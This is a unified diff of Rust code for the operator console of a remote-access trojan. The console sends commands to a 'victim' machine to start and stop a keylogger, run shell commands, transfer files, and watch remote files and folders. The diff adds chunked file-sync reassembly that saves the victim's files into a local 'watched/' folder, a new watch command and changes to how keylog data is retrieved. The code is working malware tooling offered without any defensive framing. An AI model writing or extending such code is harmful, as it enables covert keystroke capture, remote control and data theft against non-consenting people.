@@ -5,7 +5,6 @@ use std::net::{Ipv4Addr, IpAddr, SocketAddr, UdpSocket};
 use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
 use std::thread;
 use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
-
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::transport::{transport_channel, TransportChannelType::Layer3};
 use pnet_datalink as datalink;
@@ -18,14 +17,14 @@ use packet::{PacketHeader, HEADER_SIZE,
              PACKET_TYPE_ACK, PACKET_TYPE_HEARTBEAT,
              PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP,
              PACKET_TYPE_CTRL, PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
-             PACKET_TYPE_FILE_WATCH,
-             FILE_WATCH_UPDATE, FILE_WATCH_DELETE,
+             PACKET_TYPE_FILE_SYNC,
+             FILE_SYNC_CREATE, FILE_SYNC_UPDATE, FILE_SYNC_DELETE,
+             FLAG_LAST_CHUNK, CHUNK_SIZE,
              CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
              CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL};
 
-const BUFFER_SIZE: usize = 4096;
+const BUFFER_SIZE: usize = 8192;
 const MAX_RETRIES: u32 = 3;
-const CHUNK_SIZE: usize = 1024;
 
 #[derive(Clone, Copy, PartialEq)]
 enum SessionState {
@@ -45,6 +44,7 @@ pub struct Commander {
     pending_commands: HashMap<[u8; 16], Instant>,
     keylog_buffer: HashMap<Ipv4Addr, Vec<u8>>,
     file_watch_buffer: HashMap<Ipv4Addr, Vec<u8>>,
+    file_sync_reassembly: HashMap<[u8; 16], (String, Vec<u8>)>,  // message_id -> (path, data)
     file_watch_active: bool,
     file_watch_path: Option<String>,
     file_watch_local_path: Option<String>,
@@ -64,6 +64,7 @@ impl Commander {
             pending_commands: HashMap::new(),
             keylog_buffer: HashMap::new(),
             file_watch_buffer: HashMap::new(),
+            file_sync_reassembly: HashMap::new(),
             file_watch_active: false,
             file_watch_path: None,
             file_watch_local_path: None,
@@ -120,7 +121,7 @@ impl Commander {
             println!("\n[CONNECTED] -> {:?}", ip);
         }
         if self.file_watch_active {
-            println!("[*] File watch ACTIVE: {}", self.file_watch_path.as_ref().map_or("unknown", |v| v));
+            println!("[*] Watch ACTIVE: {}", self.file_watch_path.as_ref().map_or("unknown", |v| v));
         }
         println!("1) Start Keylogger");
         println!("2) Stop Keylogger");
@@ -128,9 +129,9 @@ impl Commander {
         println!("4) Run Shell Command");
         println!("5) Transfer File to Victim");
         println!("6) Transfer File from Victim");
-        println!("7) Watch a File for changes");
+        println!("7) Watch File/Folder (Unified)");
         if self.file_watch_active {
-            println!("8) Stop File Watch");
+            println!("8) Stop Watch");
             println!("9) Uninstall Agent");
             println!("10) Disconnect");
         } else {
@@ -142,7 +143,7 @@ impl Commander {
         let selection = prompt("Selection > ");
         
         if !watch_active.load(Ordering::SeqCst) && self.file_watch_active {
-            println!("[*] File watch was stopped");
+            println!("[*] Watch was stopped");
             self.file_watch_active = false;
             self.file_watch_path = None;
             self.file_watch_local_path = None;
@@ -155,24 +156,24 @@ impl Commander {
             "4" => self.run_program(),
             "5" => self.upload_file(),
             "6" => self.download_file(),
-            "7" => self.file_watcher(&watch_active),
+            "7" => self.unified_watch(&watch_active),
             "8" => {
                 if self.file_watch_active {
-                    self.stop_file_watch();
+                    self.stop_watch();
                 } else {
                     self.uninstall();
                 }
             }
             "9" => {
                 if self.file_watch_active {
-                    self.stop_file_watch();
+                    self.stop_watch();
                 } else {
                     self.disconnect();
                 }
             }
             "10" => {
                 if self.file_watch_active {
-                    self.stop_file_watch();
+                    self.stop_watch();
                 }
             }
             "0" => {
@@ -339,7 +340,7 @@ impl Commander {
                             if let Some(ip) = self.victim_ip {
                                 match header.subtype {
                                     FILE_WATCH_UPDATE => {
-                                        if payload.len() > 0 {
+                                        if header.content_length > 0 {
                                             self.file_watch_buffer.entry(ip)
                                                 .or_insert_with(Vec::new)
                                                 .extend_from_slice(payload);
@@ -394,12 +395,63 @@ impl Commander {
             .retain(|_, sent| now.duration_since(*sent) < Duration::from_secs(10));
     }
 
+    // ADD THIS - Handle FILE_SYNC chunk
+    fn handle_file_sync_chunk(&mut self, header: PacketHeader, payload: &[u8]) {
+        if payload.is_empty() { return; }
+        
+        let path_len = payload[0] as usize;
+        if payload.len() < 1 + path_len { return; }
+        
+        let path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
+        let file_data = &payload[1+path_len..];
+        
+        // Create local path in watched/ directory
+        let local_path = format!("watched/{}", path.replace('/', "_").replace('\\', "_"));
+        
+        // Ensure watched directory exists
+        let _ = std::fs::create_dir_all("watched");
+        
+        // Get or create entry in reassembly buffer
+        let entry = self.file_sync_reassembly
+            .entry(header.message_id)
+            .or_insert_with(|| (path.clone(), Vec::new()));
+        
+        // Append chunk data
+        entry.1.extend_from_slice(file_data);
+        
+        // Check if last chunk
+        if header.flags & FLAG_LAST_CHUNK != 0 {
+            if let Some((full_path, full_data)) = self.file_sync_reassembly.remove(&header.message_id) {
+                let _ = std::fs::write(&local_path, &full_data);
+                println!("[+] File synced: {} -> {} ({} bytes)", full_path, local_path, full_data.len());
+            }
+        }
+    }
+
+    // ADD THIS - Handle FILE_SYNC delete
+    fn handle_file_sync_delete(&mut self, payload: &[u8]) {
+        if payload.is_empty() { return; }
+        
+        let path_len = payload[0] as usize;
+        if payload.len() < 1 + path_len { return; }
+        
+        let path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
+        let local_path = format!("watched/{}", path.replace('/', "_").replace('\\', "_"));
+        
+        let _ = std::fs::remove_file(&local_path);
+        println!("[!] File deleted: {}", local_path);
+    }
+
     fn start_keylogger(&mut self) {
+        println!("[*] Starting keylogger on victim...");
         self.send_control(CTRL_START_KEYLOGGER);
+        println!("[+] Keylogger start command sent");
     }
 
     fn stop_keylogger(&mut self) {
+        println!("[*] Stopping keylogger on victim...");
         self.send_control(CTRL_STOP_KEYLOGGER);
+        println!("[+] Keylogger stop command sent");
     }
 
     fn request_keylog_file(&mut self) {
@@ -408,27 +460,19 @@ impl Commander {
         
         println!("[*] Waiting for keylog data (Ctrl+C to cancel)...");
         let start = Instant::now();
-        
-        // FIX: Increase timeout to 60 seconds
-        while start.elapsed() < Duration::from_secs(60) && self.running.load(Ordering::SeqCst) {
+        while start.elapsed() < Duration::from_secs(30) && self.running.load(Ordering::SeqCst) {
             self.process_incoming();
-            
             if let Some(ip) = self.victim_ip {
                 if let Some(data) = self.keylog_buffer.get(&ip) {
-                    // FIX: Save even if buffer has data (not just non-empty check)
-                    println!("\n[+] Received {} bytes of keylog data", data.len());
-                    
                     if !data.is_empty() {
+                        println!("\n[+] Received {} bytes of keylog data", data.len());
                         if let Ok(mut f) = std::fs::File::create("keylog.txt") {
                             let _ = f.write_all(data);
                             println!("[+] Saved to keylog.txt");
                         }
-                    } else {
-                        println!("[!] No keystrokes captured yet");
+                        self.keylog_buffer.remove(&ip);
+                        return;
                     }
-                    
-                    self.keylog_buffer.remove(&ip);
-                    return;
                 }
             }
             thread::sleep(Duration::from_millis(200));
@@ -566,8 +610,9 @@ impl Commander {
         }
     }
 
-    fn file_watcher(&mut self, watch_active: &Arc<AtomicBool>) {
-        let remote_path = prompt("Remote file path to watch: ");
+    // ADD THIS - Unified watch function (dynamically detects file or folder)
+    fn unified_watch(&mut self, watch_active: &Arc<AtomicBool>) {
+        let remote_path = prompt("Remote path to watch (file or folder): ");
 
         if remote_path.is_empty() {
             println!("[!] Invalid path");
@@ -575,16 +620,13 @@ impl Commander {
         }
 
         std::fs::create_dir_all("watched").ok();
-        std::fs::create_dir_all("watched/deleted").ok();
 
-        let local_filename = remote_path.split('/').last().unwrap_or("watched_file");
-        let local_path = format!("watched/{}", local_filename);
+        println!("[*] Watching {} (dynamically detects file/folder)", remote_path);
+        println!("[*] Local save location: watched/{}", remote_path);
 
-        println!("[*] Watching {}", remote_path);
-        println!("[*] Local path {}", local_path);
-
+        // Send unified watch command (0x77)
         let mut request = Vec::new();
-        request.push(0x71);
+        request.push(0x77);
         request.push(remote_path.as_bytes().len() as u8);
         request.extend_from_slice(remote_path.as_bytes());
 
@@ -593,37 +635,14 @@ impl Commander {
             return;
         }
 
-        println!("[+] Watch request sent. Receiving initial file content...");
-        
-        let mut file_data = Vec::new();
-        let start = Instant::now();
-        
-        while start.elapsed() < Duration::from_secs(30) && self.running.load(Ordering::SeqCst) {
-            self.process_incoming();
-            
-            if let Some(ip) = self.victim_ip {
-                if let Some(data) = self.keylog_buffer.get(&ip) {
-                    if data.len() == 1 && data[0] == 0xFF {
-                        break;
-                    }
-                    file_data.extend_from_slice(data);
-                    self.keylog_buffer.remove(&ip);
-                }
-            }
-            thread::sleep(Duration::from_millis(100));
-        }
-        
-        if !file_data.is_empty() {
-            let _ = std::fs::write(&local_path, &file_data);
-            println!("[+] Initial file saved ({} bytes)", file_data.len());
-        }
+        println!("[+] Watch request sent. Monitoring for changes...");
 
         self.file_watch_active = true;
         self.file_watch_path = Some(remote_path.clone());
-        self.file_watch_local_path = Some(local_path.clone());
+        self.file_watch_local_path = Some("watched/".to_string());
         watch_active.store(true, Ordering::SeqCst);
 
-        println!("[*] Monitoring for file changes (Ctrl+C to stop)...");
+        println!("[*] Press Ctrl+C to stop watching...");
 
         while self.running.load(Ordering::SeqCst)
             && watch_active.load(Ordering::SeqCst)
@@ -637,15 +656,16 @@ impl Commander {
         self.file_watch_local_path = None;
         watch_active.store(false, Ordering::SeqCst);
 
-        println!("[*] File watch stopped");
+        println!("[*] Watch stopped");
     }
 
-    fn stop_file_watch(&mut self) {
-        println!("[*] Stopping file watch...");
+    fn stop_watch(&mut self) {
+        println!("[*] Stopping watch...");
 
+        // Send stop watch command (0x78)
         if let Some(ref remote_path) = self.file_watch_path {
             let mut stop_request = Vec::new();
-            stop_request.push(0x74);
+            stop_request.push(0x78);
             stop_request.push(remote_path.as_bytes().len() as u8);
             stop_request.extend_from_slice(remote_path.as_bytes());
             let _ = self.send_packet(PACKET_TYPE_CMD, 0, &stop_request);
@@ -654,8 +674,9 @@ impl Commander {
         self.file_watch_active = false;
         self.file_watch_path = None;
         self.file_watch_local_path = None;
+        self.file_sync_reassembly.clear();
 
-        println!("[+] File watch stopped");
+        println!("[+] Watch stopped");
     }
 
     fn uninstall(&mut self) {
@@ -674,7 +695,7 @@ impl Commander {
         println!("Disconnecting from victim...");
         
         if self.file_watch_active {
-            self.stop_file_watch();
+            self.stop_watch();
         }
         
         if let Some(ref session) = self.knock_session {
@@ -687,6 +708,7 @@ impl Commander {
         self.knock_session = None;
         self.pending_commands.clear();
         self.keylog_buffer.clear();
+        self.file_sync_reassembly.clear();
         
         println!("[+] Disconnected");
     }
